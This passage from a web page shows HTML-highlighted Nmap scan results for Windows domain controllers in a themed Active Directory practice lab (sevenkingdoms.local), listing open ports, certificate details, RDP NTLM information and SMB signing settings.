<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">32</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Terminal</span><span class="w"> </span><span class="nx">Services</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">19</span><span class="nx">T20</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">rdp</span><span class="o">-</span><span class="nx">ntlm</span><span class="o">-</span><span class="nx">info</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Target_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">SEVENKINGDOMS</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">SEVENKINGDOMS</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">NetBIOS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">KINGSLANDING</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">DNS_Domain_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">DNS_Computer_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">kingslanding</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">DNS_Tree_Name</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">Product_Version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">10.0.17763</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">System_Time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">26</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
<span class="w">    </span><span class="mi">5985</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="mi">5986</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">http</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">HTTPAPI</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="w"> </span><span class="p">(</span><span class="nx">SSDP</span><span class="o">/</span><span class="nx">UPnP</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">tls</span><span class="o">-</span><span class="nx">alpn</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">http</span><span class="o">/</span><span class="m m-Double">1.1</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">VAGRANT</span><span class="o">-</span><span class="mi">2019</span><span class="p">,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">vagrant</span><span class="o">-</span><span class="mi">2019</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2027</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">18</span><span class="nx">T20</span><span class="p">:</span><span class="mi">19</span><span class="p">:</span><span class="mi">10</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="mi">0</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">Found</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">Microsoft</span><span class="o">-</span><span class="nx">HTTPAPI</span><span class="o">/</span><span class="m m-Double">2.0</span>
<span class="w">    </span><span class="nx">MAC</span><span class="w"> </span><span class="nx">Address</span><span class="p">:</span><span class="w"> </span><span class="nx">BC</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="nx">AD</span><span class="p">:</span><span class="mi">5</span><span class="nx">F</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">KINGSLANDING</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>

<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">results</span><span class="p">:</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">time</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">start_date</span><span class="p">:</span><span class="w"> </span><span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">smb2</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">mode</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="w">   </span><span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="w"> </span>
<span class="w">    </span><span class="o">|</span><span class="nx">_</span><span class="w">    </span><span class="nx">Message</span><span class="w"> </span><span class="nx">signing</span><span class="w"> </span><span class="nx">enabled</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">required</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_nbstat</span><span class="p">:</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">name</span><span class="p">:</span><span class="w"> </span><span class="nx">KINGSLANDING</span><span class="p">,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">user</span><span class="p">:</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">unknown</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">NetBIOS</span><span class="w"> </span><span class="nx">MAC</span><span class="p">:</span><span class="w"> </span><span class="nx">bc</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="nx">ad</span><span class="p">:</span><span class="mi">5</span><span class="nx">f</span><span class="w"> </span><span class="p">(</span><span class="nx">Proxmox</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Solutions</span><span class="w"> </span><span class="nx">GmbH</span><span class="p">)</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.1.0.11</span>
<span class="w">    </span><span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00022</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="w">    </span><span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">986</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="w">    </span><span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="w">    </span><span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
<span class="w">    </span><span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">25</span><span class="nx">Z</span><span class="p">)</span>
<span class="w">    </span><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="w">    </span><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="w">    </span><span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
<span class="w">    </span><span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
<span class="w">    </span><span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
<span class="w">    </span><span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">23</span>
<span class="w">    </span><span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="w">    </span><span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">28</span><span class="nx">T09</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">33</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="nx">s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
<span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">winterfell</span><span class="p">.</span><span class="nx">north</span><span class="p">.</span><span class="nx">sevenkingdoms</span><span class="p">.</span><span class="nx">local</span>
